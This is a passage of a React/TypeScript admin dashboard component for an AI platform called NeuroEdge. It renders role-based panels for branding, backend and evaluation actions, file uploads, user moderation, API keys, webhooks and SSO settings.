          <img src={brandingDraft.floatingChatBackgroundUrl || defaultBranding.logoUrl} alt="floating bg preview" style={{ width: "100%", height: 78, objectFit: "cover", borderRadius: 8, border: "1px solid rgba(148,163,184,0.35)" }} />
          <img src={brandingDraft.loginBackgroundUrl || defaultBranding.logoUrl} alt="login bg preview" style={{ width: "100%", height: 78, objectFit: "cover", borderRadius: 8, border: "1px solid rgba(148,163,184,0.35)" }} />
        </div>
        <div style={{ display: "grid", gap: 8 }}>
          <div style={{ ...row, alignItems: "center" }}>
            <span>Main chat overlay opacity</span>
            <input
              type="range"
              min={0.2}
              max={1}
              step={0.02}
              value={brandingDraft.mainChatOverlayOpacity}
              onChange={(e) => setBrandingDraft((p) => ({ ...p, mainChatOverlayOpacity: Number(e.target.value) }))}
              style={{ width: 180 }}
            />
          </div>
          <div style={{ ...row, alignItems: "center" }}>
            <span>Floating overlay opacity</span>
            <input
              type="range"
              min={0.2}
              max={1}
              step={0.02}
              value={brandingDraft.floatingOverlayOpacity}
              onChange={(e) => setBrandingDraft((p) => ({ ...p, floatingOverlayOpacity: Number(e.target.value) }))}
              style={{ width: 180 }}
            />
          </div>
          <div style={{ ...row, alignItems: "center" }}>
            <span>Login overlay opacity</span>
            <input
              type="range"
              min={0.2}
              max={1}
              step={0.02}
              value={brandingDraft.loginOverlayOpacity}
              onChange={(e) => setBrandingDraft((p) => ({ ...p, loginOverlayOpacity: Number(e.target.value) }))}
              style={{ width: 180 }}
            />
          </div>
          <div style={{ ...row, alignItems: "center" }}>
            <span>Accent color</span>
            <input
              type="color"
              value={brandingDraft.accentColor || "#2563eb"}
              onChange={(e) => setBrandingDraft((p) => ({ ...p, accentColor: e.target.value }))}
              style={{ width: 64, height: 30, padding: 0, border: "none", background: "transparent" }}
            />
          </div>
          <div style={{ ...row, alignItems: "center" }}>
            <span>Glass blur</span>
            <input
              type="range"
              min={0}
              max={24}
              step={1}
              value={brandingDraft.glassBlur}
              onChange={(e) => setBrandingDraft((p) => ({ ...p, glassBlur: Number(e.target.value) }))}
              style={{ width: 180 }}
            />
          </div>
        </div>
        <div style={{ ...log, whiteSpace: "pre-wrap" }}>
          Future options: custom fonts, animated gradients, per-workspace themes, scheduled themes, campaign branding, locale-based branding.
        </div>
        <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
          <button style={primary} onClick={saveBrandingSettings}>Save Branding</button>
          <button
            style={chip}
            onClick={() => {
              setBrandingDraft(defaultBranding);
              saveBranding(defaultBranding);
              addNotification({ type: "info", message: "Branding reset to defaults." });
            }}
          >
            Reset Default
          </button>
        </div>
      </Card>
      <Card title="System Health & Security">
        <Stat label="Uptime" value={`${adminMetrics?.uptimeSec || 0}s`} />
        <Stat label="Heap Used" value={formatBytes(adminMetrics?.memory?.heapUsed || 0)} />
        <Stat label="Security Alerts" value={String(securityAlerts.length)} />
        <button style={chip} onClick={() => exportData("security_alerts", securityAlerts)}>Export Alerts</button>
      </Card>
      <Card title="Operations Control">
        <div style={row}>
          <span>Restart Kernel</span>
          <button style={chip} onClick={() => requestServiceRestart("kernel")}>Request</button>
        </div>
        <div style={row}>
          <span>Restart ML</span>
          <button style={chip} onClick={() => requestServiceRestart("ml")}>Request</button>
        </div>
        <div style={row}>
          <span>Restart Orchestrator</span>
          <button style={chip} onClick={() => requestServiceRestart("orchestrator")}>Request</button>
        </div>
      </Card>
      <Card title="Future Feature Pipeline">
        {futureFeatures.map((f) => (
          <div key={f.id} style={log}>
            {f.name} • {f.phase} • {f.priority}
          </div>
        ))}
      </Card>
      <Card title="Backend Capabilities">
        <div style={{ display: "flex", flexWrap: "wrap", gap: 8 }}>
          <button style={chip} onClick={() => runBackendAction("GET:/system/status")}>System Status</button>
          <button style={chip} onClick={() => runBackendAction("GET:/status")}>Orchestrator Status</button>
          <button style={chip} onClick={() => runBackendAction("GET:/auth/whoami")}>Auth WhoAmI</button>
          <button style={chip} onClick={() => runBackendAction("GET:/mesh/nodes")}>Mesh Nodes</button>
          <button style={chip} onClick={() => runBackendAction("/mesh/register", { id: `dash-${Date.now()}`, baseUrl: "http://localhost:8095", kind: "dashboard", capabilities: ["infer"] })}>Mesh Register</button>
          <button style={chip} onClick={() => runBackendAction("/mesh/heartbeat", { id: "dash-node" })}>Mesh Heartbeat</button>
          <button style={chip} onClick={() => runBackendAction("/mesh/metrics", { id: "dash-node", latency_ms: 8, load: 0.2, cache_size: 5 })}>Mesh Metrics</button>
          <button style={chip} onClick={() => runBackendAction("/mesh/train-signal", { id: "dash-node", signal: { quality: "high", source: "dashboard" } })}>Mesh Train Signal</button>
          <button style={chip} onClick={() => runBackendAction("GET:/fed/model")}>Federated Model</button>
          <button style={chip} onClick={() => runBackendAction("/fed/sign", { payload: { id: "dash-sample", ts: Date.now() } })}>Federated Sign</button>
          <button style={chip} onClick={() => runBackendAction("/fed/update", { update: { id: "dash-sample", n_features: 3, classes: ["a"], coef: [[0,0,0]], intercept: [0] }, sig: "" })}>Federated Update</button>
          <button style={chip} onClick={() => runBackendAction("GET:/doctrine/rules")}>Doctrine Rules</button>
          <button style={chip} onClick={() => runBackendAction("/doctrine/rules", { id: `rule-${Date.now()}`, version: 1, enabled: true, category: "security", action: "block", pattern: "prompt injection", message: "Blocked by doctrine." })}>Doctrine Upsert</button>
          <button style={chip} onClick={() => runBackendAction("GET:/self-expansion/analyze")}>Self Expansion</button>
          <button style={chip} onClick={() => runBackendAction("/self-expansion/propose", { goal: "improve runtime observability and safety" })}>Expansion Propose</button>
          <button style={chip} onClick={() => runBackendAction("/self-expansion/generate-module", { name: "runtime_monitor", purpose: "monitor system health", path: "orchestrator/src/generated/runtime_monitor.ts", confirm: false })}>Generate Module (Preview)</button>
          <button style={chip} onClick={() => runBackendAction("GET:/training/samples?limit=20")}>Training Samples</button>
          <button style={chip} onClick={() => runBackendAction("/training/feedback", { query: "sample", response: "sample response", rating: "up", tags: ["dashboard"] })}>Training Feedback</button>
          <button style={chip} onClick={() => runBackendAction("GET:/training/export?limit=100")}>Training Export</button>
          <button style={chip} onClick={() => runBackendAction("GET:/admin/evals/coverage")}>Eval Coverage</button>
          <button style={chip} onClick={() => runBackendAction("/admin/evals/run", { suite: "core" })}>Run Core Eval</button>
          <button style={chip} onClick={() => runBackendAction("/admin/evals/run-batch", { suites: ["core", "reasoning", "coding", "research"] })}>Run Eval Batch</button>
          <button style={chip} onClick={() => runBackendAction("/admin/redteam/run", {})}>Run Red-Team</button>
          <button style={chip} onClick={() => runBackendAction("GET:/admin/reliability/overview?windowHours=24")}>Reliability Snapshot</button>
          <button style={chip} onClick={() => runBackendAction("GET:/admin/retrieval/freshness?windowHours=72")}>Retrieval Freshness</button>
          <button style={chip} onClick={() => runBackendAction("GET:/admin/trust/signals?windowHours=72")}>Trust Signals</button>
          <button style={chip} onClick={() => runBackendAction("GET:/admin/trust/consistency?windowHours=72")}>Trust Consistency</button>
          <button style={chip} onClick={() => runBackendAction("GET:/admin/quality/benchmark/trends?windowDays=30")}>Benchmark Trends</button>
          <button style={chip} onClick={() => runBackendAction("GET:/admin/quality/benchmark/regression?windowDays=30")}>Benchmark Regression</button>
          <button style={chip} onClick={() => runBackendAction("GET:/admin/sre/concurrency")}>SRE Concurrency</button>
          <button style={chip} onClick={() => runBackendAction("/admin/quality/hardening/run", {})}>Quality Hardening Run</button>
          <button style={chip} onClick={() => runBackendAction("GET:/billing/usage")}>Billing Usage</button>
          <button style={chip} onClick={() => runBackendAction("GET:/storage/state")}>Storage State</button>
          <button style={chip} onClick={() => runBackendAction("GET:/storage/events?limit=50")}>Storage Events</button>
          <button style={chip} onClick={() => runBackendAction("/storage/event", { type: "dashboard.event", payload: { source: "founder_console" } })}>Storage Append Event</button>
          <button style={chip} onClick={() => runBackendAction("GET:/idverse/status")}>IDVerse Status</button>
          <button style={chip} onClick={() => runBackendAction("GET:/neuroedge/user/identity?userId=u2")}>User Identity</button>
          <button style={chip} onClick={() => runBackendAction("/neuroedge/liveness-check", { userId: "u2", sessionId: `live-${Date.now()}` })}>Liveness Check</button>
          <button style={chip} onClick={() => runBackendAction("/neuroedge/biometric-match", { userId: "u2", referenceId: "ref-001" })}>Biometric Match</button>
          <button style={chip} onClick={() => exportOutputTxt("backend_output", backendOutput || "No backend output yet.")}>Export TXT</button>
          <button style={chip} onClick={() => exportOutputWord("backend_output", backendOutput || "No backend output yet.")}>Export Word</button>
          <button style={chip} onClick={() => printOutputPdf("Backend Output", backendOutput || "No backend output yet.")}>Export PDF</button>
          <button style={chip} onClick={() => setBackendOutput(null)}>Clear Output</button>
        </div>
        <div style={{ display: "grid", gap: 8, marginTop: 10 }}>
          <div style={{ display: "flex", gap: 8 }}>
            <select value={endpointMethod} onChange={(e) => setEndpointMethod(e.target.value as "GET" | "POST")} style={{ ...input, maxWidth: 110 }}>
              <option value="GET">GET</option>
              <option value="POST">POST</option>
            </select>
            <input value={endpointPath} onChange={(e) => setEndpointPath(e.target.value)} placeholder="/path" style={input} />
            <button style={primary} onClick={runEndpointConsole}>Run Endpoint</button>
          </div>
          {endpointMethod === "POST" && (
            <textarea
              value={endpointBody}
              onChange={(e) => setEndpointBody(e.target.value)}
              placeholder='{"key":"value"}'
              style={{ ...input, minHeight: 90, fontFamily: "ui-monospace, SFMono-Regular, Menlo, monospace" }}
            />
          )}
        </div>
        <pre style={{ ...log, whiteSpace: "pre-wrap", maxHeight: 240, overflow: "auto" }}>
          {backendOutput ? JSON.stringify(backendOutput, null, 2) : "No backend output yet."}
        </pre>
      </Card>
      <Card title="Twin Systems">
        <div style={{ display: "flex", flexWrap: "wrap", gap: 8 }}>
          <button style={chip} onClick={() => runTwinAction("/twin/scan")}>Twin Scan</button>
          <button style={chip} onClick={() => runTwinAction("/twin/analyze")}>Twin Analyze</button>
          <button style={chip} onClick={() => runTwinAction("/twin/evolve", { current_version: "1.0" })}>Twin Evolve</button>
          <button style={chip} onClick={() => runTwinAction("GET:/twin/report")}>Twin Report</button>
          <button style={chip} onClick={() => runTwinAction("/neurotwin/calibrate", { owner: "Joseph Were", tone: "direct", communication_style: "strategic", risk_appetite: "medium", goals: ["Scale NeuroEdge"], writing_samples: [] })}>NeuroTwin Calibrate</button>
          <button style={chip} onClick={() => runTwinAction("GET:/neurotwin/profile")}>NeuroTwin Profile</button>
          <button style={chip} onClick={() => runTwinAction("GET:/neurotwin/report")}>NeuroTwin Report</button>
          <button style={chip} onClick={() => exportOutputTxt("twin_output", twinOutput || "No twin output yet.")}>Export TXT</button>
          <button style={chip} onClick={() => exportOutputWord("twin_output", twinOutput || "No twin output yet.")}>Export Word</button>
          <button style={chip} onClick={() => printOutputPdf("Twin Output", twinOutput || "No twin output yet.")}>Export PDF</button>
          <button style={chip} onClick={() => setTwinOutput(null)}>Clear Output</button>
        </div>
        <div style={{ display: "grid", gap: 8 }}>
          <input
            value={twinQuestion}
            onChange={(e) => setTwinQuestion(e.target.value)}
            placeholder="Ask Twin: e.g. which image is used by floating chat and where is it?"
            style={input}
          />
          <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
            <input
              value={twinZipPath}
              onChange={(e) => setTwinZipPath(e.target.value)}
              placeholder="Optional server zip path: /home/.../project.zip"
              style={{ ...input, flex: 1, minWidth: 260 }}
            />
            <button style={primary} onClick={askTwin}>Ask Twin</button>
          </div>
          <div style={{ display: "flex", gap: 8, flexWrap: "wrap", alignItems: "center" }}>
            <label style={chip}>
              <input
                type="checkbox"
                checked={twinIncludeAnalyze}
                onChange={(e) => setTwinIncludeAnalyze(e.target.checked)}
                style={{ marginRight: 6 }}
              />
              Include Analyze
            </label>
            <label style={chip}>
              <input
                type="checkbox"
                checked={twinIncludeReport}
                onChange={(e) => setTwinIncludeReport(e.target.checked)}
                style={{ marginRight: 6 }}
              />
              Include Report
            </label>
            <span style={muted}>
              Tier: {twinUploadTier} • Policy limit:{" "}
              {twinUploadTier === "founder" ? "100GB per zip" : twinUploadTier === "admin" ? "20GB per zip" : twinUploadTier === "paid" ? "5GB per zip" : "default"}
            </span>
          </div>
          <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
            <label style={chip}>
              Upload Files
              <input
                type="file"
                multiple
                style={{ display: "none" }}
                onChange={(e) => handleTwinUpload(e.target.files)}
              />
            </label>
            <label style={chip}>
              Upload Folder
              <input
                type="file"
                multiple
                // eslint-disable-next-line @typescript-eslint/ban-ts-comment
                // @ts-ignore non-standard but supported by Chromium
                webkitdirectory=""
                style={{ display: "none" }}
                onChange={(e) => handleTwinUpload(e.target.files)}
              />
            </label>
            <label style={chip}>
              Upload ZIP
              <input
                type="file"
                multiple
                accept=".zip,application/zip,application/x-zip-compressed"
                style={{ display: "none" }}
                onChange={(e) => handleTwinZipUpload(e.target.files)}
              />
            </label>
            <button
              style={chip}
              onClick={() => {
                setTwinUploadedFiles([]);
                setTwinUploadedZips([]);
              }}
            >
              Clear Uploaded
            </button>
            <span style={muted}>Uploaded files: {twinUploadedFiles.length}</span>
            <span style={muted}>Uploaded zips: {twinUploadedZips.length}</span>
          </div>
        </div>
        <pre style={{ ...log, whiteSpace: "pre-wrap", maxHeight: 240, overflow: "auto" }}>
          {twinOutput
            ? typeof twinOutput?.answer === "string"
              ? `${twinOutput.answer}\n\n${JSON.stringify(twinOutput, null, 2)}`
              : JSON.stringify(twinOutput, null, 2)
            : "No twin output yet."}
        </pre>
      </Card>
    </div>
  );

  const adminView = (
    <div style={grid}>
      {trainingStudioCard}
      {domainRegistryCard}
      {accessControlCard}
      {deviceProtectionCard}
      {aegisShieldCard}
      {creatorEngineCard}
      {cortexCoreCard}
      <Card title="User Moderation">
        {users.map((u) => (
          <div key={u.id} style={row}>
            <span>{u.name} ({u.status})</span>
            <div style={{ display: "flex", gap: 6 }}>
              <button style={chip} onClick={() => updateUserStatus(u.id, u.status === "active" ? "review" : "active")}>
                {u.status === "active" ? "Flag" : "Restore"}
              </button>
              <button style={chip} onClick={() => assignRole(u.id, u.role === "admin" ? "moderator" : "admin")}>
                {u.role === "admin" ? "Demote" : "Promote"}
              </button>
            </div>
          </div>
        ))}
      </Card>
      <Card title="Offer Management">
        <input placeholder="Offer name" value={newOfferName} onChange={(e) => setNewOfferName(e.target.value)} style={input} />
        <input placeholder="Discount %" value={newOfferPct} onChange={(e) => setNewOfferPct(e.target.value)} style={input} />
        <button style={primary} onClick={addOffer}>Create Offer</button>
        {offers.map((o) => (
          <div key={o.id} style={row}>
            <span>{o.name} ({o.discountPct}% / {o.audience})</span>
            <div style={{ display: "flex", gap: 6 }}>
              <select
                value={o.audience}
                onChange={(e) => callAction("/admin/dashboard/offers/upsert", { offer: { ...o, audience: e.target.value as Offer["audience"] } })}
                style={{ ...input, width: 120 }}
              >
                <option value="all">all</option>
                <option value="new_users">new users</option>
                <option value="enterprise">enterprise</option>
              </select>
              <button
                style={chip}
                onClick={async () => {
                  if (o.active && !confirmSafeAction({ title: `${o.name} offer`, actionLabel: "disable" })) return;
                  await callAction("/admin/dashboard/offers/toggle", { id: o.id });
                }}
              >
                {o.active ? "Disable" : "Enable"}
              </button>
            </div>
          </div>
        ))}
      </Card>
      <Card title="Content Review Queue">
        <div style={{ display: "flex", justifyContent: "flex-end" }}>
          <button style={chip} onClick={() => setAdminLogs([])}>Clear View</button>
        </div>
        {adminLogs.slice(0, 12).map((l, i) => (
          <div key={i} style={log}>{l.type}</div>
        ))}
      </Card>
      <Card title="Support Tickets">
        <div style={{ display: "flex", gap: 8 }}>
          <input value={newTicket} onChange={(e) => setNewTicket(e.target.value)} placeholder="Ticket subject..." style={input} />
          <button style={primary} onClick={addSupportTicket}>Add</button>
        </div>
        {supportTickets.map((t) => (
          <div key={t.id} style={row}>
            <span>{t.id} • {t.subject}</span>
            <div style={{ display: "flex", gap: 6 }}>
              <select
                value={t.status}
                onChange={(e) => callAction("/admin/dashboard/tickets/upsert", { ticket: { ...t, status: e.target.value as SupportTicket["status"] } })}
                style={{ ...input, width: 110 }}
              >
                <option value="open">open</option>
                <option value="triaged">triaged</option>
                <option value="resolved">resolved</option>
              </select>
              <button
                style={chip}
                onClick={() =>
                  runGuarded(`ticket ${t.id}`, () => callAction("/admin/dashboard/tickets/delete", { id: t.id }), "close ticket")
                }
              >
                Close
              </button>
            </div>
          </div>
        ))}
      </Card>
      <Card title="Activity & Reports">
        <Stat label="Logs" value={String(adminLogs.length)} />
        <Stat label="Audit events" value={String(adminAudit.length)} />
        <button style={chip} onClick={() => { setAdminLogs([]); setAdminAudit([]); }}>Clear View</button>
        <button style={chip} onClick={() => exportData("admin_audit", adminAudit)}>Export Report</button>
      </Card>
    </div>
  );

  const developerView = (
    <div style={grid}>
      {creatorEngineCard}
      {cortexCoreCard}
      <Card title="API Keys">
        <div style={log}>Primary key: {maskKey(String(import.meta.env.VITE_NEUROEDGE_API_KEY || ""))}</div>
        <button style={chip} onClick={addDevApiKey}>+ Create Key</button>
        {devApiKeys.map((k) => (
          <div key={k.id} style={row}>
            <span>{k.name} • {k.keyMasked}</span>
            <div style={{ display: "flex", gap: 6 }}>
              <button
                style={chip}
                onClick={() => {
                  const value = String(k.apiKey || k.keyMasked || "");
                  if (!value) return;
                  navigator.clipboard?.writeText(value);
                  addNotification({ type: "success", message: `Copied key for ${k.name}` });
                }}
              >
                Copy
              </button>
              <button
                style={chip}
                onClick={() => callAction("/admin/dashboard/api-keys/toggle", { id: k.id })}
              >
                {k.revoked ? "Restore" : "Revoke"}
              </button>
            </div>
          </div>
        ))}
      </Card>
      <Card title="Usage Tracking">
        <Stat label="Requests" value={String(reqTotal)} />
        <Stat label="Total Tokens" value={tokenTotal.toLocaleString()} />
        <Stat label="Input Tokens" value={String(usage?.totals?.inputTokens || 0)} />
        <Stat label="Output Tokens" value={String(usage?.totals?.outputTokens || 0)} />
      </Card>
      <Card title="Webhook Setup">
        <input value={devWebhook} onChange={(e) => setDevWebhook(e.target.value)} placeholder="https://example.com/webhook" style={input} />
        <select value={webhookEvent} onChange={(e) => setWebhookEvent(e.target.value)} style={input}>
          <option value="chat.completed">chat.completed</option>
          <option value="ai.inference.done">ai.inference.done</option>
          <option value="agent.run.finished">agent.run.finished</option>
        </select>
        <button style={chip} onClick={addWebhook}>Save Webhook</button>
        {webhooks.map((w) => (
          <div key={w.id} style={row}>
            <span>{w.event} → {w.url}</span>
            <div style={{ display: "flex", gap: 6 }}>
              <button style={chip} onClick={() => testWebhook(w.id)}>Test</button>
              <button
                style={chip}
                onClick={() =>
                  runGuarded(`webhook ${w.url}`, () => callAction("/admin/dashboard/webhooks/delete", { id: w.id }))
                }
              >
                Delete
              </button>
            </div>
          </div>
        ))}
      </Card>
      <Card title="Model & Env">
        <select value={modelControl.model} onChange={(e) => setModelControl((p) => ({ ...p, model: e.target.value }))} style={input}>
          <option value="neuroedge-7b-instruct">neuroedge-7b-instruct</option>
          <option value="neuroedge-13b-instruct">neuroedge-13b-instruct</option>
          <option value="neuroedge-70b-router">neuroedge-70b-router</option>
        </select>
        <select value={devEnvironment} onChange={(e) => setDevEnvironment(e.target.value as any)} style={input}>
          <option value="dev">dev</option>
          <option value="staging">staging</option>
          <option value="prod">prod</option>
        </select>
      </Card>
      <Card title="Debug Tools">
        <button style={chip} onClick={() => window.dispatchEvent(new CustomEvent("neuroedge:navigate", { detail: "history" }))}>Open History + Logs</button>
        <button style={chip} onClick={() => exportData("debug_logs", adminLogs.slice(0, 100))}>Export Debug Logs</button>
      </Card>
    </div>
  );

  const agentView = (
    <div style={grid}>
      <Card title="Agent Studio">
        <button style={primary} onClick={addAgentProfile}>+ Create Agent</button>
        {agentsLocal.length === 0 ? <div style={muted}>No agents configured yet.</div> : agentsLocal.map((a) => (
          <div key={a.id} style={{ ...row, ...(selectedAgentId === a.id ? { border: "1px solid rgba(125,211,252,0.55)", borderRadius: 8, padding: 6 } : {}) }}>
            <button style={chip} onClick={() => setSelectedAgentId(a.id)}>{a.name}</button>
            <button
              style={chip}
              onClick={() => runGuarded(`agent ${a.name}`, () => callAction("/admin/dashboard/agents/delete", { id: a.id }))}
            >
              Delete
            </button>
          </div>
        ))}
        {adminAgents.length > 0 && (
          <div style={{ marginTop: 8 }}>
            <div style={muted}>Live runtime agents</div>
            {adminAgents.map((a: any, i: number) => (
              <div key={`live-${i}`} style={log}>{a.name || `Agent-${i + 1}`} • {a.status || "running"}</div>
            ))}
          </div>
        )}
      </Card>
      <Card title="Knowledge Base & Prompting">
        <input type="file" style={{ color: "var(--ne-fg)" }} />
        {selectedAgent ? (
          <>
            <input
              value={selectedAgent.name}
              onChange={(e) => updateAgent(selectedAgent.id, { name: e.target.value })}
              style={input}
            />
            <textarea
              value={`You are ${selectedAgent.name}. Operate with ${selectedAgent.permission} permission and ${selectedAgent.memoryDays}d memory.`}
              readOnly
              style={{ ...input, minHeight: 120 }}
            />
          </>
        ) : (
          <div style={muted}>Select an agent to edit its settings.</div>
        )}
      </Card>
      <Card title="Integrations & Permissions">
        {selectedAgent ? (
          <>
            <div style={row}>
              <span>Permission</span>
              <select
                value={selectedAgent.permission}
                onChange={(e) => updateAgent(selectedAgent.id, { permission: e.target.value as AgentProfile["permission"] })}
                style={{ ...input, width: 140 }}
              >
                <option value="workspace">workspace</option>
                <option value="project">project</option>
                <option value="read_only">read_only</option>
              </select>
            </div>
            {["research", "code", "math", "files", "webhooks", "chat"].map((tool) => (
              <div key={tool} style={row}>
                <span>{tool}</span>
                <button style={chip} onClick={() => toggleAgentTool(selectedAgent.id, tool)}>
                  {selectedAgent.tools.includes(tool) ? "Enabled" : "Disabled"}
                </button>
              </div>
            ))}
          </>
        ) : (
          <div style={muted}>No agent selected.</div>
        )}
      </Card>
      <Card title="Analytics + Memory Control">
        <Stat label="Agent events" value={String(adminLogs.filter((e) => String(e.type).includes("agent")).length)} />
        {selectedAgent ? (
          <div style={{ display: "flex", gap: 8 }}>
            <input
              type="number"
              value={selectedAgent.memoryDays}
              onChange={(e) => updateAgent(selectedAgent.id, { memoryDays: Number(e.target.value) || 1 })}
              style={{ ...input, width: 120 }}
            />
            <button style={chip} onClick={() => addNotification({ type: "success", message: "Memory policy updated." })}>Save</button>
          </div>
        ) : (
          <div style={muted}>Select an agent to set memory policy.</div>
        )}
      </Card>
    </div>
  );

  const userView = (
    <div style={grid}>
      {creatorEngineCard}
      {cortexCoreCard}
      <Card title="Chat & Prompt Workspace">
        <Stat label="Chats" value={String(conversationStats.chats)} />
        <Stat label="Messages" value={String(conversationStats.messages)} />
        <Stat label="Latest Chat" value={conversationStats.latest} />
      </Card>
      <Card title="Plan & Usage">
        <Stat label="Plan" value={plans.find((p) => p.active)?.name || "Free"} />
        <Stat label="Requests" value={String(reqTotal)} />
        <Stat label="Tokens" value={tokenTotal.toLocaleString()} />
      </Card>
      <Card title="Payment Details">
        <div style={log}>Billing email: {payment.billingEmail || "not set"}</div>
        <div style={log}>Card: {payment.cardNumberMasked || "not set"}</div>
      </Card>
      <Card title="Saved Files & Notifications">
        <input type="file" style={{ color: "var(--ne-fg)" }} />
        <button style={chip} onClick={() => addNotification({ type: "info", message: "Notifications configured." })}>Configure Notifications</button>
      </Card>
      <Card title="Saved Prompts">
        <input value={newPromptTitle} onChange={(e) => setNewPromptTitle(e.target.value)} placeholder="Prompt title" style={input} />
        <textarea value={newPromptText} onChange={(e) => setNewPromptText(e.target.value)} placeholder="Prompt text..." style={{ ...input, minHeight: 90 }} />
        <button style={primary} onClick={addSavedPrompt}>Save Prompt</button>
        {savedPrompts.map((p) => (
          <div key={p.id} style={row}>
            <span>{p.title}</span>
            <div style={{ display: "flex", gap: 6 }}>
              <button style={chip} onClick={() => navigator.clipboard?.writeText(p.text)}>Copy</button>
              <button
                style={chip}
                onClick={() => runGuarded(`prompt ${p.title}`, () => callAction("/admin/dashboard/prompts/delete", { id: p.id }))}
              >
                Delete
              </button>
            </div>
          </div>
        ))}
      </Card>
    </div>
  );

  const enterpriseView = (
    <div style={grid}>
      {deviceProtectionCard}
      {aegisShieldCard}
      {creatorEngineCard}
      {cortexCoreCard}
      <Card title="Team Roles & Department Controls">
        {users.map((u) => (
          <div key={u.id} style={row}>
            <span>{u.name}</span>
            <select value={u.role} onChange={(e) => assignRole(u.id, e.target.value as UserRecord["role"])} style={{ ...input, width: 130 }}>
              <option value="user">user</option>
              <option value="moderator">moderator</option>
              <option value="admin">admin</option>
              <option value="developer">developer</option>
              <option value="founder">founder</option>
            </select>
          </div>
        ))}
      </Card>
      <Card title="Usage by Department">
        <div style={{ display: "grid", gap: 8 }}>
          <div style={{ display: "flex", gap: 8 }}>
            <input value={newDepartmentName} onChange={(e) => setNewDepartmentName(e.target.value)} placeholder="Department name" style={input} />
            <input value={newDepartmentMembers} onChange={(e) => setNewDepartmentMembers(e.target.value)} placeholder="Members" style={{ ...input, maxWidth: 100 }} />
            <input value={newDepartmentTokens} onChange={(e) => setNewDepartmentTokens(e.target.value)} placeholder="Tokens/month" style={{ ...input, maxWidth: 140 }} />
            <button style={primary} onClick={addDepartment}>Add</button>
          </div>
          {enterpriseDepartments.map((d) => (
            <div key={d.id} style={row}>
              <span>{d.name}: {d.tokensPerMonth.toLocaleString()} tokens / month</span>
              <div style={{ display: "flex", gap: 6 }}>
                <input
                  type="number"
                  value={d.members}
                  onChange={(e) => setEnterpriseDepartments((prev) => prev.map((x) => (x.id === d.id ? { ...x, members: Number(e.target.value) || 1 } : x)))}
                  onBlur={(e) => callAction("/admin/dashboard/enterprise/departments/upsert", { department: { ...d, members: Number(e.target.value) || 1 } })}
                  style={{ ...input, width: 80 }}
                />
                <button
                  style={chip}
                  onClick={() =>
                    runGuarded(`department ${d.name}`, () => callAction("/admin/dashboard/enterprise/departments/delete", { id: d.id }), "remove")
                  }
                >
                  Remove
                </button>
              </div>
            </div>
          ))}
        </div>
      </Card>
      <Card title="Billing, Audit, Compliance">
        <button style={chip} onClick={() => exportData("enterprise_audit", adminAudit)}>Export Audit Logs</button>
        <button style={chip} onClick={() => exportData("enterprise_usage", usage)}>Export Usage</button>
      </Card>
      <Card title="SSO & Governance">
        <div style={row}>
          <span>Enable SSO</span>
          <button style={chip} onClick={() => setSsoConfig((prev: any) => ({ ...prev, enabled: !prev.enabled }))}>
            {ssoConfig.enabled ? "Enabled" : "Disabled"}
          </button>
        </div>
        <select
          value={ssoConfig.provider}
          onChange={(e) => setSsoConfig((prev: any) => ({ ...prev, provider: e.target.value }))}
          style={input}
        >
          <option value="okta">okta</option>
          <option value="entra">entra</option>
          <option value="auth0">auth0</option>
          <option value="google-workspace">google-workspace</option>
        </select>
        <input value={ssoConfig.domain} onChange={(e) => setSsoConfig((prev: any) => ({ ...prev, domain: e.target.value }))} placeholder="Company domain" style={input} />
        <input value={ssoConfig.clientId} onChange={(e) => setSsoConfig((prev: any) => ({ ...prev, clientId: e.target.value }))} placeholder="Client ID" style={input} />
        <input value={ssoConfig.metadataUrl} onChange={(e) => setSsoConfig((prev: any) => ({ ...prev, metadataUrl: e.target.value }))} placeholder="Metadata URL" style={input} />
        <button style={primary} onClick={() => callAction("/admin/dashboard/enterprise/sso/save", { ssoConfig })}>Save SSO</button>
      </Card>
    </div>
  );

  return (
    <div style={page}>
      <div style={hero}>
        <h2 style={{ margin: 0 }}>NeuroEdge Sovereign Command Center</h2>
        <div style={muted}>
          {dashboardRole === "founder" || dashboardRole === "admin"
            ? "Leadership orchestration for product, revenue, agents, security, and enterprise operations."
            : "Your workspace for chats, agents, usage, and account operations."}
        </div>
      </div>

      {canAccessAdminOps ? (
        <div style={serviceGrid}>
          {services.map((s) => (
            <div key={s.name} style={serviceChip(s.status)}>
              <strong>{s.name}</strong>
              <span>{s.detail}</span>
            </div>
          ))}
        </div>
      ) : (
        <div style={serviceGrid}>
          <div style={serviceChip("online")}>
            <strong>NeuroEdge</strong>
            <span>Ready</span>
          </div>
        </div>
      )}

      <div style={tabs}>
        {[
          ["founder", "Founder"],
          ["admin", "Admin"],
          ["developer", "Developer"],
          ["agents", "AI Agents"],
          ["user", "User"],
          ["enterprise", "Enterprise"],
        ]
          .filter(([id]) => allowedViews.includes(id as View))
          .map(([id, label]) => (
          <button key={id} style={tab(view === id)} onClick={() => setView(id as View)}>
            {label}
          </button>
          ))}
      </div>

      <div style={{ ...card, marginBottom: 10 }}>
        <div style={{ ...cardHeader }}>
          <h3 style={{ margin: 0 }}>Dashboard Search Assistant</h3>
        </div>
        <div style={{ padding: "0.8rem", display: "grid", gap: 8 }}>
          <input
            value={dashboardAssistantQuery}
            onChange={(e) => setDashboardAssistantQuery(e.target.value)}
            placeholder="Ask where to find something: e.g. rollback, api key, twin report, media generation, billing..."
            style={input}
          />
          <div style={{ ...muted, fontSize: "0.84rem" }}>
            Assistant scope: {dashboardRole}. It surfaces pages and sections you can access, then guides you directly.
          </div>
          <div style={{ display: "grid", gap: 6, maxHeight: 220, overflowY: "auto" }}>
            {dashboardAssistantResults.length === 0 ? (
              <div style={muted}>No match. Try words like: security, twin, creator, billing, links, api, sso.</div>
            ) : (
              dashboardAssistantResults.map((item) => (
                <div key={item.id} style={{ ...log, margin: 0 }}>
                  <div style={{ display: "flex", justifyContent: "space-between", gap: 8, alignItems: "center" }}>
                    <div>
                      <div style={{ fontWeight: 700 }}>{item.title}</div>
                      <div style={muted}>{item.summary}</div>
                    </div>
                    <button
                      style={chip}
                      onClick={() => {
                        setView(item.view);
                        addNotification({ type: "info", message: `Opened ${item.view} dashboard for ${item.title}.` });
                      }}
                    >
                      Open
                    </button>
                  </div>
                </div>
              ))
            )}
          </div>
        </div>
      </div>

      {view === "founder" && founderView}
      {view === "admin" && adminView}
      {view === "developer" && developerView}
      {view === "agents" && agentView}
      {view === "user" && userView}
      {view === "enterprise" && enterpriseView}

